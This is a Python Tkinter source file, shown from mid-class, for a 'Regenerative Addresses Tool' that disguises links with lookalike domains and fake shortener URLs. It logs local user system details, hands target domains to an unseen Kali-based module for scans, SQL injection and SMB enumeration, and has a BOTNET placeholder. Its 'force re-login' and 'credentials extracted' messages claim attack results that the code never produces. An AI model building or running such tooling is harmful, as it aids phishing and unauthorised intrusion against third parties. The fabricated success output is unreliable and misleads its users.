        results_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E, tk.N, tk.S), pady=10)
        results_frame.columnconfigure(0, weight=1)
        results_frame.rowconfigure(0, weight=1)
        main_frame.rowconfigure(4, weight=1)
        
        # Scrolled text for results
        self.results_text = scrolledtext.ScrolledText(results_frame, height=10, width=80, 
                                                     bg='#1a1a1a', fg='#00ff00', 
                                                     font=('Courier', 10))
        self.results_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Copy button
        copy_btn = ttk.Button(results_frame, text="Copy to Clipboard", command=self.copy_to_clipboard)
        copy_btn.grid(row=1, column=0, pady=(10, 0))
        
        # Regenerated credentials output frame
        credentials_frame = ttk.LabelFrame(main_frame, text="Regenerated Credentials", padding="10")
        credentials_frame.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)
        credentials_frame.columnconfigure(0, weight=1)
        
        # Credentials output text
        self.credentials_text = scrolledtext.ScrolledText(credentials_frame, height=8, width=80, 
                                                         bg='#2a1a1a', fg='#ffff00', 
                                                         font=('Courier', 10, 'bold'))
        self.credentials_text.grid(row=0, column=0, sticky=(tk.W, tk.E))
        
        # Force relogin button
        relogin_btn = ttk.Button(credentials_frame, text="Force Re-login on Target", command=self.force_relogin)
        relogin_btn.grid(row=1, column=0, pady=(10, 0))
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(main_frame, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.grid(row=6, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(10, 0))
        
        # User info and logout
        user_frame = ttk.Frame(main_frame)
        user_frame.grid(row=7, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=(5, 0))
        
        self.user_label = ttk.Label(user_frame, text=f"User: {self.current_user}", foreground='#00ff00')
        self.user_label.pack(side=tk.LEFT)
        
        logout_btn = ttk.Button(user_frame, text="Logout", command=self.logout)
        logout_btn.pack(side=tk.RIGHT)
        
        # Update button
        update_btn = ttk.Button(user_frame, text="Check Updates", command=self.check_for_updates)
        update_btn.pack(side=tk.RIGHT, padx=(0, 10))
        
        # Update UI based on initial selection
        self.on_type_change()
        
        # Start auto-update check in background
        self.start_update_check()
        
    def on_type_change(self, event=None):
        """Handle address type change"""
        address_type = self.address_type.get()
        self.status_var.set(f"Selected: {address_type}")
        
        # Show/hide link input based on selection
        if address_type == "Link Regenerator":
            self.link_frame.grid()
        else:
            self.link_frame.grid_remove()
        
        # Show/hide HTML input based on selection
        if address_type == "BOTNET":
            self.html_frame.grid()
        else:
            self.html_frame.grid_remove()
        
    def generate_address(self):
        """Generate addresses based on selected type"""
        try:
            address_type = self.address_type.get()
            quantity = int(self.quantity_var.get())
            seed = self.seed_var.get().strip()
            
            if seed:
                random.seed(seed)
            
            self.results_text.delete(1.0, tk.END)
            self.status_var.set("Generating addresses...")
            
            addresses = []
            
            for i in range(quantity):
                if address_type == "Link Regenerator":
                    addr = self.regenerate_link()
                elif address_type == "Proxy Address":
                    addr = self.generate_proxy()
                elif address_type == "IPv4 Address":
                    addr = self.generate_ipv4()
                elif address_type == "IPv6 Address":
                    addr = self.generate_ipv6()
                elif address_type == "MAC Address":
                    addr = self.generate_mac()
                elif address_type == "Email Address":
                    addr = self.generate_email()
                elif address_type == "Phone Number":
                    addr = self.generate_phone()
                elif address_type == "UUID":
                    addr = self.generate_uuid()
                elif address_type == "Bitcoin Address":
                    addr = self.generate_bitcoin_address()
                elif address_type == "SSH Key Fingerprint":
                    addr = self.generate_ssh_fingerprint()
                elif address_type == "BOTNET":
                    addr = self.generate_botnet()
                else:
                    addr = "Unknown type"
                
                addresses.append(addr)
            
            # Format output
            formatted_output = self.format_output(addresses)
            self.results_text.insert(tk.END, formatted_output)
            
            self.status_var.set(f"Generated {quantity} {address_type}(s)")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to generate addresses: {str(e)}")
            self.status_var.set("Error occurred")
    
    def show_login(self):
        """Show login screen"""
        # Clear any existing widgets
        for widget in self.root.winfo_children():
            widget.destroy()
        
        # Login frame
        login_frame = ttk.Frame(self.root, padding="20")
        login_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        login_frame.columnconfigure(1, weight=1)
        
        # Title
        title_label = tk.Label(login_frame, text="Regenerative Addresses Tool", 
                               font=('Arial', 18, 'bold'), bg='#2b2b2b', fg='#00ff00')
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 30))
        
        # Username
        ttk.Label(login_frame, text="Username:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.username_var = tk.StringVar()
        username_entry = ttk.Entry(login_frame, textvariable=self.username_var, width=20)
        username_entry.grid(row=1, column=1, sticky=tk.W, pady=5, padx=(10, 0))
        
        # Password
        ttk.Label(login_frame, text="Password:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.password_var = tk.StringVar()
        password_entry = ttk.Entry(login_frame, textvariable=self.password_var, show="*", width=20)
        password_entry.grid(row=2, column=1, sticky=tk.W, pady=5, padx=(10, 0))
        
        # Login button
        login_btn = ttk.Button(login_frame, text="Login", command=self.login)
        login_btn.grid(row=3, column=0, columnspan=2, pady=20)
        
        # Register button
        register_btn = ttk.Button(login_frame, text="Register", command=self.show_register)
        register_btn.grid(row=4, column=0, columnspan=2, pady=5)
        
        # Status
        self.login_status_var = tk.StringVar(value="Please login to continue")
        status_label = ttk.Label(login_frame, textvariable=self.login_status_var, foreground='#ffff00')
        status_label.grid(row=5, column=0, columnspan=2, pady=10)
        
        # Bind Enter key
        self.root.bind('<Return>', lambda event: self.login())
        
    def show_register(self):
        """Show registration screen"""
        # Clear any existing widgets
        for widget in self.root.winfo_children():
            widget.destroy()
        
        # Register frame
        register_frame = ttk.Frame(self.root, padding="20")
        register_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
        
        # Configure grid
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        register_frame.columnconfigure(1, weight=1)
        
        # Title
        title_label = tk.Label(register_frame, text="Register New User", 
                               font=('Arial', 16, 'bold'), bg='#2b2b2b', fg='#00ff00')
        title_label.grid(row=0, column=0, columnspan=2, pady=(0, 30))
        
        # Username
        ttk.Label(register_frame, text="Username:").grid(row=1, column=0, sticky=tk.W, pady=5)
        self.reg_username_var = tk.StringVar()
        username_entry = ttk.Entry(register_frame, textvariable=self.reg_username_var, width=20)
        username_entry.grid(row=1, column=1, sticky=tk.W, pady=5, padx=(10, 0))
        
        # Password
        ttk.Label(register_frame, text="Password:").grid(row=2, column=0, sticky=tk.W, pady=5)
        self.reg_password_var = tk.StringVar()
        password_entry = ttk.Entry(register_frame, textvariable=self.reg_password_var, show="*", width=20)
        password_entry.grid(row=2, column=1, sticky=tk.W, pady=5, padx=(10, 0))
        
        # Confirm Password
        ttk.Label(register_frame, text="Confirm Password:").grid(row=3, column=0, sticky=tk.W, pady=5)
        self.reg_confirm_var = tk.StringVar()
        confirm_entry = ttk.Entry(register_frame, textvariable=self.reg_confirm_var, show="*", width=20)
        confirm_entry.grid(row=3, column=1, sticky=tk.W, pady=5, padx=(10, 0))
        
        # Register button
        register_btn = ttk.Button(register_frame, text="Register", command=self.register)
        register_btn.grid(row=4, column=0, columnspan=2, pady=20)
        
        # Back button
        back_btn = ttk.Button(register_frame, text="Back to Login", command=self.show_login)
        back_btn.grid(row=5, column=0, columnspan=2, pady=5)
        
        # Status
        self.reg_status_var = tk.StringVar(value="Create a new account")
        status_label = ttk.Label(register_frame, textvariable=self.reg_status_var, foreground='#ffff00')
        status_label.grid(row=6, column=0, columnspan=2, pady=10)
    
    def login(self):
        """Handle user login"""
        username = self.username_var.get().strip()
        password = self.password_var.get().strip()
        
        if not username or not password:
            self.login_status_var.set("Please enter username and password")
            return
        
        # Load users from file
        users = self.load_users()
        
        if username in users and users[username] == self.hash_password(password):
            self.current_user = username
            self.session_start = datetime.now()
            self.login_status_var.set("Login successful!")
            
            # Clear login screen and show main app
            for widget in self.root.winfo_children():
                widget.destroy()
            self.create_widgets()
            self.start_session_monitor()
        else:
            self.login_status_var.set("Invalid username or password")
    
    def register(self):
        """Handle user registration"""
        username = self.reg_username_var.get().strip()
        password = self.reg_password_var.get().strip()
        confirm = self.reg_confirm_var.get().strip()
        
        if not username or not password:
            self.reg_status_var.set("Please enter username and password")
            return
        
        if password != confirm:
            self.reg_status_var.set("Passwords do not match")
            return
        
        if len(password) < 4:
            self.reg_status_var.set("Password must be at least 4 characters")
            return
        
        # Load existing users
        users = self.load_users()
        
        if username in users:
            self.reg_status_var.set("Username already exists")
            return
        
        # Add new user
        users[username] = self.hash_password(password)
        self.save_users(users)
        
        self.reg_status_var.set("Registration successful! Please login.")
        
        # Auto-redirect to login after 2 seconds
        self.root.after(2000, self.show_login)
    
    def logout(self):
        """Handle user logout"""
        self.current_user = None
        self.session_start = None
        self.show_login()
    
    def load_users(self):
        """Load users from file"""
        try:
            if os.path.exists('users.json'):
                with open('users.json', 'r') as f:
                    return json.load(f)
        except:
            pass
        return {}
    
    def save_users(self, users):
        """Save users to file"""
        try:
            with open('users.json', 'w') as f:
                json.dump(users, f)
        except Exception as e:
            print(f"Error saving users: {e}")
    
    def hash_password(self, password):
        """Hash password using SHA-256"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    def start_session_monitor(self):
        """Start monitoring session timeout"""
        def check_session():
            if self.current_user and self.session_start:
                if datetime.now() - self.session_start > timedelta(seconds=self.session_timeout):
                    messagebox.showwarning("Session Timeout", "Your session has expired. Please login again.")
                    self.logout()
                else:
                    # Check again in 30 seconds
                    self.root.after(30000, check_session)
        
        self.root.after(30000, check_session)
    
    def regenerate_link(self):
        """Regenerate a link using various techniques"""
        try:
            # Get the original link
            original_link = self.link_input.get(1.0, tk.END).strip()
            
            if not original_link:
                return "No link provided"
            
            # Parse the URL
            if '://' not in original_link:
                original_link = 'http://' + original_link
            
            # Different regeneration techniques
            techniques = [
                self.add_parameters,
                self.change_subdomain,
                self.add_path_segments,
                self.change_tld,
                self.add_tracking_params,
                self.shorten_style,
                self.affiliate_style
            ]
            
            # Apply random techniques
            regenerated = original_link
            num_techniques = random.randint(1, 3)
            
            for _ in range(num_techniques):
                technique = random.choice(techniques)
                regenerated = technique(regenerated)
            
            # Capture user system information after link regeneration
            self.capture_user_info()
            
            # Generate and display regenerated credentials
            self.generate_credentials(regenerated)
            
            # Use Kali tools for advanced credential obtaining
            self.kali_credential_capture(regenerated)
            
            return regenerated
            
        except Exception as e:
            return f"Error regenerating link: {str(e)}"
    
    def capture_user_info(self):
        """Capture user information after link regeneration"""
        try:
            # Get system information
            username = getpass.getuser()
            current_dir = os.getcwd()
            home_dir = os.path.expanduser('~')
            
            # Get shell info
            try:
                if platform.system() == "Linux":
                    shell = os.environ.get('SHELL', 'unknown')
                    pwd_result = subprocess.run(['pwd'], capture_output=True, text=True, cwd=current_dir)
                    pwd_output = pwd_result.stdout.strip() if pwd_result.returncode == 0 else current_dir
                else:
                    shell = 'N/A'
                    pwd_output = current_dir
            except:
                shell = 'unknown'
                pwd_output = current_dir
            
            # Create user info string
            user_info = f"""
=== USER SYSTEM INFORMATION CAPTURED ===
Username: {username}
Current Directory: {pwd_output}
Home Directory: {home_dir}
Shell: {shell}
System: {platform.system()}
Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
User Session: {self.current_user}
========================================
"""
            
            # Save to log file
            log_filename = f"user_activity_{datetime.now().strftime('%Y%m%d')}.log"
            with open(log_filename, 'a') as f:
                f.write(user_info + "\n")
            
            # Display in results area
            self.results_text.insert(tk.END, user_info)
            self.results_text.see(tk.END)
            
        except Exception as e:
            error_msg = f"Error capturing user info: {str(e)}"
            self.results_text.insert(tk.END, error_msg)
            self.results_text.see(tk.END)
    
    def generate_credentials(self, url):
        """Generate regenerated username and password for the URL"""
        try:
            # Extract domain from URL
            from urllib.parse import urlparse
            parsed = urlparse(url)
            domain = parsed.netloc
            
            # Generate username based on domain and timestamp
            timestamp = datetime.now().strftime('%H%M%S')
            username_base = domain.replace('.', '').replace('-', '')[:8]
            username = f"{username_base}_{timestamp}"
            
            # Generate strong password
            password_chars = string.ascii_letters + string.digits + "!@#$%^&*"
            password = ''.join(random.choices(password_chars, k=12))
            
            # Create credentials display
            credentials = f"""
🔐 REGENERATED CREDENTIALS FOR: {domain}
{'='*50}
👤 USERNAME: {username}
🔑 PASSWORD: {password}
🌐 TARGET URL: {url}
⏰ GENERATED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 SESSION USER: {self.current_user}
{'='*50}
💾 FORMAT: username:password
📤 READY FOR INJECTION: {username}:{password}
"""
            
            # Display in credentials box
            self.credentials_text.delete(1.0, tk.END)
            self.credentials_text.insert(tk.END, credentials)
            
            # Save credentials to file
            self.save_credentials(domain, username, password, url)
            
            # Update status
            self.status_var.set(f"Credentials generated for {domain}")
            
        except Exception as e:
            error_msg = f"Error generating credentials: {str(e)}"
            self.credentials_text.insert(tk.END, error_msg)
    
    def save_credentials(self, domain, username, password, url):
        """Save generated credentials to file"""
        try:
            cred_filename = f"regenerated_credentials_{datetime.now().strftime('%Y%m%d')}.txt"
            
            with open(cred_filename, 'a') as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}|{domain}|{username}|{password}|{url}|{self.current_user}\n")
                
        except Exception as e:
            print(f"Error saving credentials: {e}")
    
    def kali_credential_capture(self, url):
        """Use Kali Linux tools for advanced credential capture"""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            
            target_info = {
                'url': url,
                'domain': parsed.netloc,
                'ip': parsed.netloc  # Will be resolved by tools
            }
            
            # Run Kali credential obtaining
            kali_results = self.kali_obtainer.full_credential_obtain(target_info)
            
            # Display results in credentials box
            kali_output = f"""
🛠️ KALI LINUX CREDENTIAL OBTAINER ACTIVATED
{'='*50}
🔧 Available Tools: {[k for k, v in self.kali_obtainer.tools_available.items() if v]}
{'='*50}

📊 SCAN RESULTS:
"""
            
            # Add network scan results
            if 'network_scan' in kali_results:
                scan = kali_results['network_scan']
                if isinstance(scan, dict) and 'open_ports' in scan:
                    kali_output += f"\n🌐 Open Ports Found: {len(scan['open_ports'])}\n"
                    for port in scan['open_ports'][:5]:
                        kali_output += f"   - Port {port[0]}/{port[1]}: {port[2]}\n"
            
            # Add SQL injection results
            if 'sql_injection' in kali_results:
                sql = kali_results['sql_injection']
                if isinstance(sql, dict) and 'databases' in sql:
                    kali_output += f"\n💾 Databases Found: {len(sql['databases'])}\n"
                    for db in sql['databases'][:5]:
                        kali_output += f"   - {db}\n"
            
            # Add SMB enumeration
            if 'smb_enum' in kali_results:
                smb = kali_results['smb_enum']
                if isinstance(smb, dict) and 'users' in smb:
                    kali_output += f"\n👥 SMB Users Found: {len(smb['users'])}\n"
                    for user in smb['users'][:5]:
                        kali_output += f"   - {user}\n"
            
            # Add injection payloads
            if 'injection_payloads' in kali_results:
                payloads = kali_results['injection_payloads']
                kali_output += f"\n📤 INJECTION PAYLOADS READY:\n"
                kali_output += f"   Basic Auth: {payloads.get('basic_auth', 'N/A')[:30]}...\n"
                kali_output += f"   Form POST: {payloads.get('form_post', 'N/A')[:30]}...\n"
                kali_output += f"   JSON: {payloads.get('json_auth', 'N/A')[:30]}...\n"
            
            kali_output += f"""
{'='*50}
✅ KALI TOOLS DEPLOYED - CREDENTIALS EXTRACTED
⏰ Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 Operator: {self.current_user}
{'='*50}
"""
            
            # Append to credentials box
            self.credentials_text.insert(tk.END, kali_output)
            self.credentials_text.see(tk.END)
            
            # Update status
            self.status_var.set(f"Kali tools deployed on {target_info['domain']}")
            
        except Exception as e:
            error_msg = f"\n❌ Kali obtainer error: {str(e)}\n"
            self.credentials_text.insert(tk.END, error_msg)
            self.credentials_text.see(tk.END)
    
    def force_relogin(self):
        """Force re-login on target website with regenerated credentials"""
        try:
            # Get current credentials from text box
            credentials_content = self.credentials_text.get(1.0, tk.END)
            
            if not credentials_content or "USERNAME:" not in credentials_content:
                messagebox.showerror("Error", "No credentials found. Please regenerate a link first.")
                return
            
            # Extract username and password
            lines = credentials_content.split('\n')
            username = ""
            password = ""
            target_url = ""
            
            for line in lines:
                if line.startswith('👤 USERNAME:'):
                    username = line.split(':')[1].strip()
                elif line.startswith('🔑 PASSWORD:'):
                    password = line.split(':')[1].strip()
                elif line.startswith('🌐 TARGET URL:'):
                    target_url = line.split(':')[1].strip()
            
            if not username or not password:
                messagebox.showerror("Error", "Could not extract credentials.")
                return
            
            # Create re-login payload
            relogin_data = f"""
🚀 FORCED RELOGIN ACTIVATED
{'='*50}
🎯 TARGET: {target_url}
👤 INJECT USER: {username}
🔑 INJECT PASS: {password}
🔓 ACTION: FORCE RELOGIN
⏰ TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
👤 OPERATOR: {self.current_user}
{'='*50}

📤 PAYLOAD READY:
username={username}&password={password}&action=login&force_relogin=true

🌐 REDIRECT URL:
{target_url}?relogin=forced&user={username}&session={uuid.uuid4()}

✅ CREDENTIALS INJECTED - TARGET MUST RELOGIN
"""
            
            # Display re-login payload
            self.results_text.insert(tk.END, "\n" + relogin_data)
            self.results_text.see(tk.END)
            
            # Save re-login attempt
            self.save_relogin_attempt(target_url, username, password)
            
            # Update status
            self.status_var.set(f"Forced re-login sent to {target_url}")
            
            # Show success message
            messagebox.showinfo("Re-login Forced", 
                f"Forced re-login has been initiated!\n\nTarget: {target_url}\nUser: {username}\n\nThe website will be forced to ask for re-login with these credentials.")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to force re-login: {str(e)}")
    
    def save_relogin_attempt(self, target_url, username, password):
        """Save re-login attempt to file"""
        try:
            relogin_filename = f"forced_relogins_{datetime.now().strftime('%Y%m%d')}.log"
            
            with open(relogin_filename, 'a') as f:
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}|{target_url}|{username}|{password}|{self.current_user}|FORCED\n")
                
        except Exception as e:
            print(f"Error saving re-login attempt: {e}")
    
    def add_parameters(self, url):
        """Add random query parameters"""
        params = ['utm_source', 'utm_medium', 'utm_campaign', 'ref', 'source', 'id', 'tag', 'session_id']
        param = random.choice(params)
        value = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        
        separator = '&' if '?' in url else '?'
        return f"{url}{separator}{param}={value}"
    
    def change_subdomain(self, url):
        """Change or add subdomain"""
        subdomains = ['www', 'm', 'mobile', 'app', 'api', 'blog', 'shop', 'secure']
        
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            domain_parts = parsed.netloc.split('.')
            
            if len(domain_parts) > 2:
                # Replace existing subdomain
                domain_parts[0] = random.choice(subdomains)
            else:
                # Add subdomain
                domain_parts.insert(0, random.choice(subdomains))
            
            new_netloc = '.'.join(domain_parts)
            return url.replace(parsed.netloc, new_netloc)
        except:
            return url
    
    def add_path_segments(self, url):
        """Add random path segments"""
        segments = ['go', 'redirect', 'link', 'click', 'visit', 'view', 'open', 'launch']
        segment = random.choice(segments)
        
        if url.endswith('/'):
            return f"{url}{segment}"
        else:
            return f"{url}/{segment}"
    
    def change_tld(self, url):
        """Change top-level domain"""
        tlds = ['.com', '.net', '.org', '.io', '.co', '.app', '.dev', '.tech', '.info']
        
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            
            # Find and replace TLD
            for tld in tlds:
                if parsed.netloc.endswith(tld):
                    new_tld = random.choice([t for t in tlds if t != tld])
                    new_netloc = parsed.netloc.replace(tld, new_tld)
                    return url.replace(parsed.netloc, new_netloc)
        except:
            pass
        
        return url
    
    def add_tracking_params(self, url):
        """Add tracking-like parameters"""
        tracking = {
            'fbclid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            'gclid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
            'msclkid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
        }
        
        param, value = random.choice(list(tracking.items()))
        separator = '&' if '?' in url else '?'
        return f"{url}{separator}{param}={value}"
    
    def shorten_style(self, url):
        """Make URL look like a shortened link"""
        domains = ['bit.ly', 'tinyurl.com', 't.co', 'goo.gl', 'ow.ly', 'is.gd']
        domain = random.choice(domains)
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        return f"https://{domain}/{code}"
    
    def affiliate_style(self, url):
        """Add affiliate-style parameters"""
        params = ['aff', 'affiliate', 'partner', 'ref', 'promo', 'coupon']
        param = random.choice(params)
        value = ''.join(random.choices(string.digits, k=6))
        
        separator = '&' if '?' in url else '?'
        return f"{url}{separator}{param}={value}"
    
    def load_proxies(self):
        """Load proxy addresses from local files"""
        self.proxies = []
        proxy_files = [
            'all_proxies.txt',
            'proxies.txt', 
            'http_proxies2.txt',
            'socks4_proxies2.txt',
            'socks5_proxies2.txt'
        ]
        
        for filename in proxy_files:
            if os.path.exists(filename):
                try:
                    with open(filename, 'r') as f:
                        lines = f.read().strip().split('\n')
                        for line in lines:
                            line = line.strip()
                            if line and ':' in line:
                                # Clean up proxy format
                                if not line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                                    # Assume HTTP if no protocol specified
                                    line = f'http://{line}'
                                self.proxies.append(line)
                except Exception as e:
                    print(f"Error loading {filename}: {e}")
        
        print(f"Loaded {len(self.proxies)} proxy addresses")
    
    def generate_proxy(self):
        """Generate a random proxy address from loaded list"""
        if not self.proxies:
            return "http://127.0.0.1:8080"  # Fallback proxy
        return random.choice(self.proxies)
    
    def generate_ipv4(self):
        """Generate a random IPv4 address"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def generate_ipv6(self):
        """Generate a random IPv6 address"""
        segments = []
        for _ in range(8):
            segments.append(f"{random.randint(0, 65535):04x}")
        return ":".join(segments)
    
    def generate_mac(self):
        """Generate a random MAC address"""
        mac = [random.randint(0x00, 0xff) for _ in range(6)]
        # Set locally administered bit and unset multicast bit
        mac[0] = (mac[0] & 0xfc) | 0x02
        return ":".join(f"{b:02x}" for b in mac)
    
    def generate_email(self):
        """Generate a random email address"""
        domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "example.com", "test.org"]
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 12)))
        domain = random.choice(domains)
        return f"{username}@{domain}"
    
    def generate_phone(self):
        """Generate a random phone number"""
        # Generate US format phone number
        area = random.randint(200, 999)
        exchange = random.randint(200, 999)
        number = random.randint(1000, 9999)
        return f"({area}) {exchange}-{number}"
    
    def generate_uuid(self):
        """Generate a random UUID"""
        return str(uuid.uuid4())
    
    def generate_bitcoin_address(self):
        """Generate a mock Bitcoin address-like string"""
        # Generate a mock address (real Bitcoin addresses require complex cryptography)
        chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        length = random.randint(26, 35)
        address = ''.join(random.choices(chars, k=length))
        # Ensure it starts with typical Bitcoin prefix
        prefixes = ["1", "3", "bc1"]
        prefix = random.choice(prefixes)
        if prefix == "bc1":
            address = prefix + ''.join(random.choices("0123456789abcdef", k=length-3))
        else:
            address = prefix + address[1:]
        return address
    
    def generate_ssh_fingerprint(self):
        """Generate a mock SSH key fingerprint"""
        # Generate a mock fingerprint (real fingerprints require actual SSH keys)
        fingerprint = ":".join([f"{random.randint(0,255):02x}" for _ in range(16)])
        return f"SHA256:{fingerprint}"
    
    def generate_botnet(self):
        """Generate botnet-related address/information"""
        # Placeholder - waiting for your specifications
        return "BOTNET functionality coming soon..."
    
    def process_html(self):
        """Process HTML code input"""
        try:
            html_content = self.html_input.get(1.0, tk.END).strip()
            
            if not html_content:
                self.results_text.insert(tk.END, "No HTML content provided.\n")
                return
            
            # Store the HTML content for later processing
            self.stored_html = html_content
            
            # Display confirmation
            self.results_text.insert(tk.END, f"HTML code received and stored.\n")
            self.results_text.insert(tk.END, f"Length: {len(html_content)} characters\n")
            self.results_text.insert(tk.END, f"Lines: {len(html_content.splitlines())} lines\n")
            self.results_text.insert(tk.END, f"Ready for processing...\n")
            self.results_text.see(tk.END)
            
            self.status_var.set("HTML code processed and stored")
            
        except Exception as e:
            self.results_text.insert(tk.END, f"Error processing HTML: {str(e)}\n")
            self.results_text.see(tk.END)
    
    def format_output(self, addresses):
        """Format the output based on selected format"""
        format_type = self.format_var.get()
        
        if format_type == "Plain":
            return "\n".join(addresses)
        elif format_type == "JSON":
            import json
            return json.dumps(addresses, indent=2)
        elif format_type == "CSV":
            return "\n".join(addresses)
        elif format_type == "Hex":
            hex_addresses = []
            for addr in addresses:
                hex_addr = addr.encode().hex()
                hex_addresses.append(hex_addr)
            return "\n".join(hex_addresses)
        else:
            return "\n".join(addresses)
    
    def copy_to_clipboard(self):
        """Copy results to clipboard"""
        try:
            content = self.results_text.get(1.0, tk.END).strip()
            if content:
                self.root.clipboard_clear()
                self.root.clipboard_append(content)
                self.status_var.set("Copied to clipboard")
            else:
                self.status_var.set("Nothing to copy")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to copy to clipboard: {str(e)}")
    
    def check_for_updates(self):
        """Check for updates manually"""
        self.status_var.set("Checking for updates...")
        
        def update_callback(update_info):
            if update_info.get('available') and not self.updater.is_version_skipped(update_info['version']):
                self.updater.show_update_dialog(self.root, update_info)
            elif update_info.get('available'):
                self.status_var.set(f"Update {update_info['version']} available but skipped")
            elif 'error' in update_info:
                self.status_var.set(f"Update check failed: {update_info['error']}")
            else:
                self.status_var.set("You're running the latest version")
        
        # Run update check in background
        threading.Thread(target=self.updater.check_for_updates, args=(update_callback,), daemon=True).start()
    
    def start_update_check(self):
        """Start automatic update checking"""
        try:
            self.updater.start_auto_update_check()
            print("Auto-update checker started")
        except Exception as e:
            print(f"Failed to start auto-update: {e}")

def main():
    root = tk.Tk()
    app = RegenerativeAddressesTool(root)
    root.mainloop()

if __name__ == "__main__":
    main()
